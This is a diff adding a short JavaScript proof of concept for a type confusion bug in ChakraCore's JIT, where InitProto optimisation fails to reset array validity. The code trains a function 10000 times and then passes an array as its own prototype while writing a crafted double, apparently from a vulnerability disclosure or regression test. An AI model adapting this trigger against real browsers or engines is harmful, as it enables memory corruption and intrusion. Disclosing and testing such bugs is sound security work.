@@ -1,0 +1,26 @@
+/*
+If a native array is used as a prototype, it is converted to a Var array by the Js::JavascriptNativeFloatArray::SetIsPrototype method.
+
+In the JIT compiler, it uses InitProto instructions to set object literals' prototype. But when optimizing those instructions, it doesn't reset the previous array validity even it can change the type of arrays. As a result, it can lead to type confusion.
+
+Note: Expressions like "obj.__proto__" don't use InitProto instructions.
+*/
+
+function opt(arr, proto) {
+    arr[0] = 1.1;
+    let tmp = {__proto__: proto};
+    arr[0] = 2.3023e-320;
+}
+
+function main() {
+    let arr = [1.1, 2.2, 3.3];
+    for (let i = 0; i < 10000; i++) {
+        opt(arr, {});
+    }
+
+    opt(arr, arr);
+    print(arr);
+
+}
+
+main();
